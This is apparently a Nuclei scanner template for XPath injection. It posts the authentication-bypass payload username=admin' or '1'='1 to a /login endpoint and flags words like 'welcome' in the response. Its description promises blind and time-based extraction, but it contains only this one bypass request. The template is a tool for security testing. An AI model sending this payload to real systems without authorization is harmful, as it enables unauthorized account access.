id: medium-webapp-xpath-injection-blind-extraction

info:
  name: XPath Injection - Blind Data Extraction
  author: elite-red-team
  severity: high
  description: |
    Advanced XPath injection with blind data extraction techniques.
    Tests boolean-based blind XPath injection, time-based blind injection,
    and error-based XPath injection for data extraction from XML databases.
  reference:
    - https://owasp.org/www-community/attacks/XPATH_Injection
    - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPath%20Injection
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
    cvss-score: 8.2
    cwe-id: CWE-643
  tags: xpath,injection,blind,data-extraction,xml

http:
  - raw:
      - |
        POST {{BaseURL}}/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        
        username=admin' or '1'='1&password=test

    matchers:
      - type: word
        part: body
        words:
          - "welcome"
          - "dashboard"
          - "success"
        condition: or
        case-insensitive: true
